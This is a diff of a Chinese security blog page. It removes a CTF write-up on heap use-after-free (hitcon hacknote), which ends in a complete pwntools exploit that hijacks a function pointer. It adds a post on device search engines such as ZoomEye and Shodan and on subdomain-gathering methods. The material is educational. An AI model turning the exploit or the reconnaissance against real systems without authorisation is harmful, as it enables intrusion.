@@ -19,24 +19,24 @@
   <meta name="author" content="清风">
   <meta name="keywords" content="">
   
-    <meta name="description" content="堆利用_UAF原理我们可以直接从字面上翻译它的意思：使用被释放的内存块。其实当一个内存块被释放之后重新使用有如下几种情况： 内存块被释放后，其对应的指针被设置为NULL，再次使用时程序会崩溃 内存块被释放后，其对应的指针没有被设置为NULL，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序有可能可以正常运转 内存块被释放后，其对应的指针没有被设置为NULL，但是在下一次使用之前，有代码">
+    <meta name="description" content="与ZoomEye类似的搜索引擎ZoomEyeZoomEye是一个强大子域名搜索引擎，类似的搜索引擎还有 ZoomEye（中文名：钟馗之眼）是一款专注于网络设备和物联网设备搜索的搜索引擎。它提供了一种通过互联网上的设备进行搜索的方式，使用户能够发现和分析各种连接到互联网的设备，包括服务器、路由器、摄像头、数据库等。ZoomEye 主要用于网络侦查、漏洞发现和网络安全研究。 以下是 ZoomEye 的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="堆利用_UAF">
-<meta property="og:url" content="http://example.com/2024/10/01/%E5%A0%86%E5%88%A9%E7%94%A8-UAF/index.html">
+<meta property="og:title" content="与ZoomEye类似的搜索引擎">
+<meta property="og:url" content="http://example.com/2024/10/01/%E4%B8%8EZoomEye%E7%B1%BB%E4%BC%BC%E7%9A%84%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/index.html">
 <meta property="og:site_name" content="清风不识字">
-<meta property="og:description" content="堆利用_UAF原理我们可以直接从字面上翻译它的意思：使用被释放的内存块。其实当一个内存块被释放之后重新使用有如下几种情况： 内存块被释放后，其对应的指针被设置为NULL，再次使用时程序会崩溃 内存块被释放后，其对应的指针没有被设置为NULL，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序有可能可以正常运转 内存块被释放后，其对应的指针没有被设置为NULL，但是在下一次使用之前，有代码">
+<meta property="og:description" content="与ZoomEye类似的搜索引擎ZoomEyeZoomEye是一个强大子域名搜索引擎，类似的搜索引擎还有 ZoomEye（中文名：钟馗之眼）是一款专注于网络设备和物联网设备搜索的搜索引擎。它提供了一种通过互联网上的设备进行搜索的方式，使用户能够发现和分析各种连接到互联网的设备，包括服务器、路由器、摄像头、数据库等。ZoomEye 主要用于网络侦查、漏洞发现和网络安全研究。 以下是 ZoomEye 的">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/130.jpg">
-<meta property="article:published_time" content="2024-10-01T13:18:46.000Z">
-<meta property="article:modified_time" content="2024-10-01T13:31:52.230Z">
+<meta property="og:image" content="http://example.com/img/131.jpg">
+<meta property="article:published_time" content="2024-10-01T14:07:19.000Z">
+<meta property="article:modified_time" content="2024-10-01T14:26:30.362Z">
 <meta property="article:author" content="清风">
 <meta property="article:tag" content="原创">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/img/130.jpg">
+<meta name="twitter:image" content="http://example.com/img/131.jpg">
   
   
   
-  <title>堆利用_UAF - 清风不识字</title>
+  <title>与ZoomEye类似的搜索引擎 - 清风不识字</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="堆利用_UAF"></span>
+            <span id="subtitle" data-typed-text="与ZoomEye类似的搜索引擎"></span>
           
         </div>
 
@@ -214,7 +214,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-01 21:18" pubdate>
+        <time datetime="2024-10-01 22:07" pubdate>
           2024年10月1日 晚上
         </time>
       </span>
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          932 字
+          960 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          8 分钟
+          9 分钟
         
       </span>
     
@@ -274,69 +274,35 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">堆利用_UAF</h1>
+            <h1 id="seo-header">与ZoomEye类似的搜索引擎</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="堆利用-UAF"><a href="#堆利用-UAF" class="headerlink" title="堆利用_UAF"></a>堆利用_UAF</h1><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>我们可以直接从字面上翻译它的意思：使用被释放的内存块。其实当一个内存块被释放之后重新使用有如下几种情况：</p>
-<p>内存块被释放后，其对应的指针被设置为NULL，再次使用时程序会崩溃<br> 内存块被释放后，其对应的指针没有被设置为NULL，在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序有可能可以正常运转<br> 内存块被释放后，其对应的指针没有被设置为NULL，但是在下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能出现问题</p>
-<p>具体的调试示例青参考下面这篇文章 这个作者还是讲的较为通俗易懂，同时这个知识也较为简单</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/108797478">好好说话之Use After Free</a></p>
-<p>接下来我会通过题目来讲解什么是UAF</p>
-<h2 id="hitcon-training-hacknote"><a href="#hitcon-training-hacknote" class="headerlink" title="hitcon-training-hacknote"></a><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">hitcon-training-hacknote</a></h2><p><img src="/img/UAF/a.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/UAF/b.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>函数名被我编辑过，大家可以用ida右键编辑方便自己记忆</p>
-<h3 id="add-note函数"><a href="#add-note函数" class="headerlink" title="add_note函数"></a>add_note函数</h3><p><img src="/img/UAF/c.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/UAF/d.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>我们仔细分析一下函数的代码，这个函数是用来创建chunk的，并把chunk地址放到(notelist+4)中</p>
-<p><img src="/img/UAF/e.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>而(notelist+i)用来存放printf_note_content函数地址</p>
-<h3 id="delnote函数"><a href="#delnote函数" class="headerlink" title="delnote函数"></a>delnote函数</h3><p><img src="/img/UAF/f.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>这个函数是用来释放chunk的，但是我们发现它并没有释放chunk的指针，这为我们UAF创造了条件</p>
-<h3 id="printf-note函数"><a href="#printf-note函数" class="headerlink" title="printf_note函数"></a>printf_note函数</h3><p><img src="/img/UAF/g.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>这个函数就是调用存在(notelist+i)里的print_note_content函数进行打印</p>
-<h3 id="magic函数"><a href="#magic函数" class="headerlink" title="magic函数"></a>magic函数</h3><p><img src="/img/UAF/h.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/UAF/v.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>这是出题人给的后门函数 </p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>可以看到这个整个程序里面并没有堆溢出的地方</p>
-<p>那么，我们先创建两个chunk来调试一下</p>
-<p><img src="/img/UAF/i.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/UAF/j.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可以看到两个chunk是通过各自的结构体chunk相连的，可以看到，每一个结构体的大小为0x10</p>
-<p><img src="/img/UAF/k.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>这里面存的就是printf_note_content的地址</p>
-<p>我们打印看看</p>
-<p><img src="/img/UAF/l.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可以看到是正常的</p>
-<p>那么接下来再释放掉</p>
-<p><img src="/img/UAF/m.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/UAF/n.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/UAF/o.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可以看到chunk已经被free掉了，但是对应的指针还没有</p>
-<p>在上面对函数的分析中知道，print_note函数的执行是依赖于notelist中存的chunk指针的</p>
-<p>那么我们是否可以把print_note_content函数的地址覆盖成magic函数，再来调用print_note函数来getflag呢？(有点绕，请仔细理解一下），答案是肯定的。</p>
-<p>那么我们接下来的思路就是如何把print_note_content覆盖</p>
-<h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>这个程序中并没有编辑函数来让我们修改</p>
-<p>但是程序中的add_note函数是可以修改内容的</p>
-<p><img src="/img/UAF/p.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>在free的时候，我们发现结构体同样也是被free的，这里面有两个0x10大小的free_chunk</p>
-<p>设想一下，如果我们申请0x8大小的chunk，那么他的大小刚好等于0x10，申请的时候就不会从新分配空间，而是从fastbin里面取出来，那么我们就可以对其中有一个chunk进行编辑</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">size</span>=p32(pre_size)+p32(size)+<span class="hljs-number">0</span>x8=<span class="hljs-number">0</span>x10<br></code></pre></td></tr></table></figure>
-
-<p> 代码如下</p>
-<p><img src="/img/UAF/q.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p> <img src="/img/UAF/r.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p> <img src="/img/UAF/s.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p> 可以看到此时print_note_content的位置已被magic函数替代</p>
-<p> <img src="/img/UAF/t.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>而这个结构体对应的是chunk0</p>
-<p>那么直接printf_note(0)即可getflag</p>
-<p> <img src="/img/UAF/u.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="完整的exp"><a href="#完整的exp" class="headerlink" title="完整的exp"></a>完整的exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./hacknote2&#x27;</span>)<br>gdb.attach(io)<br>shell=<span class="hljs-number">0x8048986</span><br>chunk=<span class="hljs-number">0x804a070</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>	io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>	io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	io.recvuntil(<span class="hljs-string">&quot;Note size :&quot;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(size))<br>	io.recvuntil(<span class="hljs-string">&quot;Content :&quot;</span>)<br>	io.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">idx</span>):<br>	io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>	io.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>	io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>	io.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br>add(<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>payload=p32(shell)<br>add(<span class="hljs-number">8</span>,payload)<br>printf(<span class="hljs-number">0</span>)<br>io.interactive()<br>pause()<br></code></pre></td></tr></table></figure>
-
-<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/108797478">好好说话之Use After Free</a></p>
-<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">ctfwiki_Use After Free</a><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/</a>)</p>
+                <h1 id="与ZoomEye类似的搜索引擎"><a href="#与ZoomEye类似的搜索引擎" class="headerlink" title="与ZoomEye类似的搜索引擎"></a>与ZoomEye类似的搜索引擎</h1><h3 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h3><p>ZoomEye是一个强大子域名搜索引擎，类似的搜索引擎还有</p>
+<p>ZoomEye（中文名：钟馗之眼）是一款专注于网络设备和物联网设备搜索的搜索引擎。它提供了一种通过互联网上的设备进行搜索的方式，使用户能够发现和分析各种连接到互联网的设备，包括服务器、路由器、摄像头、数据库等。ZoomEye 主要用于网络侦查、漏洞发现和网络安全研究。</p>
+<p>以下是 ZoomEye 的一些主要特点和功能：</p>
+<p>设备搜索： ZoomEye 允许用户通过关键字、IP 地址、域名等进行设备搜索。用户可以使用不同的搜索条件来定位特定类型的设备。</p>
+<p>图形化界面： ZoomEye 提供了图形化的用户界面，以便用户更直观地浏览和分析搜索结果。图谱和图形化视图有助于用户理解设备之间的关系。</p>
+<p>漏洞检测： ZoomEye 可以帮助用户发现互联网上的设备中存在的潜在漏洞。它可以通过检查设备的服务、开放端口等信息来提供漏洞的线索。</p>
+<p>定期扫描： ZoomEye 支持定期扫描，使用户能够跟踪设备和漏洞的变化。这有助于持续监视和评估网络的安全性。</p>
+<p>API 支持： ZoomEye 提供 API，允许开发人员集成 ZoomEye 的功能到他们的应用程序中。这使得用户能够自动化搜索和信息收集的过程。</p>
+<p>历史数据： ZoomEye 记录设备和漏洞的历史数据，用户可以查看过去的扫描结果，了解网络的发展和变化。</p>
+<p>例如对域名的搜索</p>
+<p>访问下列官网即可查询</p>
+<p><a target="_blank" rel="noopener" href="https://www.zoomeye.org/">首页 - 网络空间测绘,网络安全,漏洞分析,动态测绘,钟馗之眼,时空测绘,赛博测绘 - ZoomEye(“钟馗之眼”)网络空间搜索引擎</a></p>
+<p>与ZoomEye还有很多</p>
+<h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a><strong>Shodan</strong></h3><p>被誉为“<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E7%89%A9%E8%81%94%E7%BD%91&spm=1001.2101.3001.7020">物联网</a>的搜索引擎”，专注于扫描和索引连接到互联网的各种设备，如智能家居设备、工业控制系统（ICS）、摄像头、数据库等</p>
+<h3 id="Censys"><a href="#Censys" class="headerlink" title="Censys"></a>Censys</h3><p>提供全球互联网设备的可视化视图，帮助用户了解网络的整体安全状况 。</p>
+<h3 id="BinaryEdge"><a href="#BinaryEdge" class="headerlink" title="BinaryEdge"></a>BinaryEdge</h3><p>提供全球互联网空间的监控和数据分析服务，通过持续扫描互联网，生成实时的安全情报和数据报表 。</p>
+<h3 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h3><p>由白帽汇开发，功能全面，支持多种协议和服务的扫描与检索 。</p>
+<h3 id="Onyphe"><a href="#Onyphe" class="headerlink" title="Onyphe"></a>Onyphe</h3><p>面向网络安全专业人士的数据搜索引擎，汇集了多个来源的数据，包括开放端口、漏洞、情报和暗网活动等 。</p>
+<h3 id="Fofa"><a href="#Fofa" class="headerlink" title="Fofa"></a>Fofa</h3><p>网络空间搜索引擎，功能与ZoomEye类似，可以用于网络资产管理、漏洞扫描和威胁情报收集 。</p>
+<p>360 网络空间资产测绘：提供网络资产的监控和分析 </p>
+<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>进行子域名收集的方法有：</p>
+<p>搜索引擎：使用搜索引擎的高级搜索功能，如Google的site语法 site:example.com 。<br>证书透明度查询：通过查询证书透明度网站如crt.sh、Censys等来收集子域名 。<br>DNS记录查询：使用工具如nslookup查询域名的SRV、NS、MX、TXT等记录来收集子域名 。<br>自动化工具：如Subfinder、OneForAll、Layer子域名挖掘机等，这些工具通过多个API和字典枚举的方式自动化收集子域名 。<br>爬虫技术：通过编写爬虫程序爬取目标网站的所有页面、robots.txt文件、crossdomain.xml文件、sitemap文件等，从中筛选出子域名 </p>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>我们来用ZoomEye查询学校的子域名</p>
+<p><img src="/img/zoomeye.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
@@ -382,8 +348,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>堆利用_UAF</div>
-      <div>http://example.com/2024/10/01/堆利用-UAF/</div>
+      <div>与ZoomEye类似的搜索引擎</div>
+      <div>http://example.com/2024/10/01/与ZoomEye类似的搜索引擎/</div>
     </div>
     <div class="license-meta">
       
@@ -427,18 +393,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/01/%E4%B8%8EZoomEye%E7%B1%BB%E4%BC%BC%E7%9A%84%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/" title="与ZoomEye类似的搜索引擎">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">与ZoomEye类似的搜索引擎</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/01/%E5%A0%86%E6%BA%A2%E5%87%BA-unlink/" title="堆溢出_unlink">
-                        <span class="hidden-mobile">堆溢出_unlink</span>
+                      <a href="/2024/10/01/%E5%A0%86%E5%88%A9%E7%94%A8-UAF/" title="堆利用_UAF">
+                        <span class="hidden-mobile">堆利用_UAF</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
